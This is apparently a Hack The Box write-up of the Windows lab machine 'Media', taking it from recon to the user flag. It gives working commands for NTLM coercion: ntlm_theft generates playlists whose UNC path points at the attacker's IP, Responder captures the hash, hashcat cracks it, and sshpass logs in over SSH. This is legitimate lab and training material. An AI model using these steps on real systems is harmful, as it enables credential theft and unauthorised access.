## Overview

Media is a medium-difficulty Windows box running an Apache/XAMPP + PHP stack. The web app invites you to upload a "video application" file, and that file gets handed to Windows Media Player on the server. Media Player playlist formats can reference an entry by a network path, so a malicious playlist makes the server authenticate back to you — leaking the NTLMv2 hash of the account that opened it. Crack the hash, log in over SSH, and you have `user.txt`. This post covers recon through the user flag.

Realistic NTLM-coercion box where a WMP playlist (.wax) upload steals an NTLMv2 hash via Responder for cracking and SSH; no CVE, modest enumeration, light custom payload generation.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH for_Windows_9.5 | no creds yet |
| 80/tcp | Apache 2.4.56 (Win64) PHP/8.1.17 | "ProMotion Studio" landing page |
| 3389/tcp | ms-wbt-server (RDP) | host MEDIA |

```bash
nmap -sC -sV 10.129.234.67
nmap -p- -sV -T4 10.129.234.67
```

Three ports, no SMB and no WinRM. The web app on 80 is the only real attack surface, and RDP/SSH are the credential sinks once we get a password.

## Enumeration

The landing page is mostly static, but it carries a file-upload form for a "video application" with firstname / lastname / email fields. The wording makes a point of mentioning supported formats, all of which are Windows Media Player types.

That is the tell: if the server opens an uploaded media file in Windows Media Player, a WMP **playlist** (`.wax`, `.asx`, `.m3u`) is a hash-theft primitive. A playlist entry can be a UNC path (`\\attacker\share\x`), and when WMP tries to fetch it, Windows authenticates outbound with the logged-in user's credentials.

## Foothold

Generate the malicious playlists with `ntlm_theft` and stand up Responder to catch the authentication:

```bash
git clone https://github.com/Greenwolf/ntlm_theft
python3 ntlm_theft.py -g all -s 10.10.16.13 -f media
sudo responder -I tun0
```

Submit the `.wax` playlist through the upload form (any values for the text fields):

```bash
curl -s -X POST "http://10.129.234.67/index.php" \
  -F 'firstname=test' -F 'lastname=test' -F 'email=test@test.null' \
  -F 'fileToUpload=@media/media.wax'
```

A few seconds later Responder logs an NTLMv2-SSP hash for `MEDIA\enox`. (Confirmed working extensions: `.wax` and `.asx`; `.m3u` only fires if opened interactively.)

Crack it offline with hashcat and rockyou:

```bash
hashcat -m 5600 enox_ntlmv2.txt /usr/share/wordlists/rockyou.txt
# enox : <redacted>
```

There is no WinRM, but OpenSSH-for-Windows is listening, so the cracked password logs straight in:

```bash
sshpass -p '<redacted>' ssh -o StrictHostKeyChecking=no enox@10.129.234.67
```

```text
media\enox
```

## User flag

```bash
type C:\Users\enox\Desktop\user.txt   # HTB{...}
```

Access as `MEDIA\enox` achieved.

Privilege escalation is left as an exercise — this post stops at user.
